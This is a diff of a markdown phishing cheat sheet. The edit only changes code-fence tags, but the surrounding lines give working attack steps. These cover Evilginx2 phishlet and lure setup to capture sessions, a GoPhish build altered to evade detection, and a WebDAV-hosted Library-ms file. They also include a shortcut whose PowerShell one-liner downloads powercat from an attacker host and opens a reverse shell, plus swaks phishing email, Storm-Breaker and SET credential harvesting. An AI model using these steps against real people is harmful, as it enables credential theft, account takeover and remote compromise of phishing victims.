@@ -38,7 +38,7 @@
 
 ### Installation
 
-```c
+```console
 $ sudo apt-get install golang
 $ git clone https://github.com/kgretzky/evilginx2.git
 $ cd evilginx2
@@ -48,13 +48,13 @@ $ sudo ./build/evilginx -p ./phishlets
 
 #### Alternatively with Redirectors
 
-```c
+```console
 $ sudo ./build/evilginx -p ./phishlets -t ./redirectors -developer
 ```
 
 ### Basic Commands
 
-```c
+```console
 : phishlets
 : lures
 : sessions
@@ -62,14 +62,14 @@ $ sudo ./build/evilginx -p ./phishlets -t ./redirectors -developer
 
 ### Prepare Certificates
 
-```c
+```console
 $ sudo cp /root/.evilginx/crt/ca.crt /usr/local/share/ca-certificates/evilginx.crt
 $ sudo update-ca-certificates
 ```
 
 ### Domain Setup
 
-```c
+```console
 : config domain <DOMAIN>
 : config ipv4 <LHOST>
 ```
@@ -80,7 +80,7 @@ $ sudo update-ca-certificates
 
 > https://github.com/An0nUD4Y/Evilginx2-Phishlets
 
-```c
+```console
 : phishlets hostname <PHISHLET> <DOMAIN>
 : phishlets enable <PHISHLET>
 ```
@@ -89,14 +89,14 @@ $ sudo update-ca-certificates
 
 > https://help.evilginx.com/docs/guides/lures
 
-```c
+```console
 : lures create <PHISHLET>
 : lures get-url <ID>
 ```
 
 ### Session Handling
 
-```c
+```console
 : sessions
 : sessions <ID>
 ```
@@ -115,40 +115,40 @@ $ sudo update-ca-certificates
 
 #### Clone GoPhish
 
-```c
+```console
 $ git clone https://github.com/gophish/gophish
 ```
 
 #### Get a Custom 404 Page
 
-```c
+```console
 $ wget "https://raw.githubusercontent.com/puzzlepeaches/sneaky_gophish/main/files/404.html" -O "404.html"
 ```
 
 #### Get a Custom Phish.go
 
-```c
+```console
 $ wget "https://raw.githubusercontent.com/puzzlepeaches/sneaky_gophish/main/files/phish.go" -O "phish.go"
 ```
 
 #### Copy Custom Phish.go
 
-```c
+```console
 $ rm gophish/controllers/phish.go
 $ mv phish.go gophish/controllers/phish.go
 ```
 
 #### Copy new 404.html
 
-```c
+```console
 $ mv 404.html gophish/templates/404.html
 ```
 
-```c
+```console
 $ cd gophish
 ```
 
-```c
+```console
 $ sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request_test.go
 $ sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog.go
 $ sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog_test.go
@@ -157,32 +157,32 @@ $ sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request.go
 
 #### Stripping X-Gophish-Signature
 
-```c
+```console
 $ sed -i 's/X-Gophish-Signature/X-Signature/g' webhook/webhook.go
 ```
 
 #### Changing servername
 
-```c
+```console
 $ sed -i 's/const ServerName = "gophish"/const ServerName = "IGNORE"/' config/config.go
 ```
 
 #### Changing rid value
 
-```c
+```console
 $ read -p 'Custom RID Parameter: ' uservar
 $ sed -i 's/const RecipientParameter = "rid"/const RecipientParameter = "'$uservar'"/g' models/campaign.go
 ```
 
 #### Build
 
-```c
+```console
 $ go build
 ```
 
 ### Port Forwarding
 
-```c
+```console
 $ ssh -i ~/.ssh/<SSH_KEY> root@<RHOST> -p <RPORT> -L 3333:localhost:3333 -N -f
 ```
 
@@ -190,19 +190,19 @@ $ ssh -i ~/.ssh/<SSH_KEY> root@<RHOST> -p <RPORT> -L 3333:localhost:3333 -N -f
 
 ### Installation of wsgidav
 
-```c
+```console
 $ pip3 install wsgidav
 ```
 
 ### Start wsgidav
 
-```c
+```console
 $ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
 ```
 
 ### config.Library-ms
 
-```c
+```console
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
 <name>@windows.storage.dll,-34582</name>
@@ -230,7 +230,7 @@ Put the `config.Library-ms` file in the `webdav` folder.
 
 Right-click on Windows to create a new `shortcut file`.
 
-```c
+```console
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
 ```
 
@@ -238,7 +238,7 @@ Put the `shortcut file (*.lnk)` into the `webdav` folder.
 
 ### Send Phishing Email
 
-```c
+```console
 $ swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
 ```
 
@@ -248,7 +248,7 @@ $ swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject:
 
 ### Installation
 
-```c
+```console
 $ git clone https://github.com/ultrasecurity/Storm-Breaker.git
 $ cd Storm-Breaker
 $ sudo bash install.sh
@@ -258,7 +258,7 @@ $ sudo python3 st.py
 
 ### Start ngrok Agent
 
-```c
+```console
 $ ngrok http 2525
 ```
 
@@ -276,12 +276,12 @@ Chose a link to send to the target.
 
 ### Credential Harvesting
 
-```c
+```console
 $ sudo setoolkit
 ```
 
 Navigate to `Social-Engineering Attacks` > `Website Attack Vectors` > `Credential Harvester Attack` > `Site Cloner` == `1`, `2`, `3`, `2`.
 
-```c
+```console
 $ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --port 25 --body <FILE>.txt
 ```
